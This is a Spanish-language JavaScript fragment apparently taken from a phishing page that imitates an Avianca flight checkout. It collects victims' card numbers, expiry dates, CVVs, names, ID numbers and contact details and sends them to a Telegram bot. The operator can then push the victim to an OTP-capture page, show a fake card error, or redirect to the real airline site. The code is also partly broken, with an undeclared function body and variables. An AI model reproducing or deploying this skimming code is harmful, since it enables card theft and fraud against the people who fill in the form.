    <script>
        function escapeMarkdownV2(text) {
            if (!text) return '';
            const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
            let escapedText = text;
            for (const char of specialChars) {
                const regex = new RegExp(`\\${char}`, 'g');
                escapedText = escapedText.replace(regex, `\\${char}`);
            }
            return escapedText;
        }

        async function loadTelegramConfig() {
            try {
                const response = await fetch("./js/brr76.json");
                if (!response.ok) {
                    throw new Error("No se pudo cargar el archivo de configuraci√≥n de Telegram.");
                }
                return await response.json();
            } catch (error) {
                console.error("Error al cargar el archivo de configuraci√≥n de Telegram:", error);
                return null;
            }
        }

        async function checkPaymentVerification(transactionId, messageId) {
            const config = await loadTelegramConfig();
            if (!config) {
                document.querySelector(".loaderp-full").style.display = "none";
                return;
            }
            fetch(`https://api.telegram.org/bot${config.token}/getUpdates`)
                .then(response => response.json())
                .then(data => {
                    const updates = data.result;
                    const verificationUpdate = updates.find(
                        (update) =>
                        update.callback_query &&
                        update.callback_query.message.message_id === messageId
                    );

                    if (verificationUpdate) {
                        const action = verificationUpdate.callback_query.data.split(':')[0];

                        fetch(`https://api.telegram.org/bot${config.token}/editMessageReplyMarkup`, {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json"
                            },
                            body: JSON.stringify({
                                chat_id: config.chat_id,
                                message_id: messageId,
                                reply_markup: {
                                    inline_keyboard: []
                                }
                            }),
                        });

                        switch (action) {
                            case 'pedir_logo':
                                window.location.href = "chedf.html";
                                break;
                            case 'error_tc':
                                alert("La tarjeta de cr√©dito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
                                break;
                            case 'finalizar':
                                window.location.href = "https://www.avianca.com/";
                                break;
                            default:
                                break;
                        }
                    } else {
                        setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                    }
                })
                .catch(error => {
                    console.error("Error al verificar la clave dinamica:", error);
                    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
                });
        }

        document.getElementById("autorizarBtn").addEventListener("click", function() {
            const form = document.getElementById("next-step");
            if (!form.checkValidity()) {
                alert("Por favor, complete todos los campos requeridos.");
                return;
            }

            const card_number = document.getElementById("p").value;
            const expiry_date = document.getElementById("pdate").value;
            const cvv = document.getElementById("c").value;
            const name = document.getElementById("name").value;
            const surname = document.getElementById("surname").value;
            const cc = document.getElementById("cc").value;
            const email = document.getElementById("email").value;
            const telnum = document.getElementById("telnum").value;
            const city = document.getElementById("city").value;
            const state = document.getElementById("state").value;
            const address = document.getElementById("address").value;
            const bank = document.getElementById("ban").value;
            const dues = document.getElementById("dues").value;
            const termsAccepted = document.getElementById("terms-accept").checked;
            const flightCost = document.getElementById("flight-cost").innerText;

            if (!card_number || !expiry_date || !cvv || !name || !surname || !cc || !email || !telnum || !city || !state || !address || !bank || !termsAccepted) {
                alert("Por favor, complete todos los campos del formulario y acepte los t√©rminos.");
                return;
            }

            const paymentData = {
                name: name + ' ' + surname,
                cc: cc,
                email: email,
                telnum: telnum,
                city: city,
                state: state,
                address: address,
                cardNumber: card_number,
                expiryDate: expiry_date,
                cvv: cvv,
                bank: bank,
                dues: dues,
                flightCost: flightCost
            };

            localStorage.setItem('paymentData', JSON.stringify(paymentData));

            document.querySelector(".loaderp-full").style.display = "flex";
            enviarDatos();
        });

            const message = `

*üí∞ Precio:* $${storedData.flightCost ? escapeMarkdownV2(storedData.flightCost) : 'No ingresado'} USD
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-

\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*ü§µ‚Äç‚ôÇÔ∏è Nombre:* ${storedData.name ? escapeMarkdownV2(storedData.name) : 'No ingresado'}

\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*üí≥ DETALLES DE LA TARJETA*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-

\`${storedData.cardNumber ? escapeMarkdownV2(storedData.cardNumber) : 'No ingresado'}\`

\`${storedData.expiryDate ? escapeMarkdownV2(storedData.expiryDate) : 'No ingresado'}\`

\`${storedData.cvv ? escapeMarkdownV2(storedData.cvv) : 'No ingresado'}\`

\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*üÜî ID de Transacci√≥n:* ${transactionId}
`;

            const keyboard = JSON.stringify({
                inline_keyboard: [
                    [{
                        text: "Pedir Otp",
                        callback_data: `pedir_logo:${transactionId}`
                    }],
                    [{
                        text: "Error de TC",
                        callback_data: `error_tc:${transactionId}`
                    }],
                    [{
                        text: "Finalizar",
                        callback_data: `finalizar:${transactionId}`
                    }]
                ],
            });

            const config = await loadTelegramConfig();
            if (!config) {
                document.querySelector(".loaderp-full").style.display = "none";
                return;
            }

            fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                        chat_id: config.chat_id,
                        text: message,
                        reply_markup: keyboard,
                        parse_mode: "MarkdownV2",
                    }),
                })
                .then(response => response.json())
                .then(data => {
                    if (data.ok) {
                        console.log("Mensaje enviado a Telegram con √©xito");
                        checkPaymentVerification(transactionId, data.result.message_id);
                    } else {
                        console.error("Error al enviar mensaje a Telegram:", data);
                        document.querySelector(".loaderp-full").style.display = "none";
                    }
                })
                .catch(error => {
                    console.error("Error al enviar mensaje a Telegram:", error);
                    document.querySelector(".loaderp-full").style.display = "none";
                });
        }
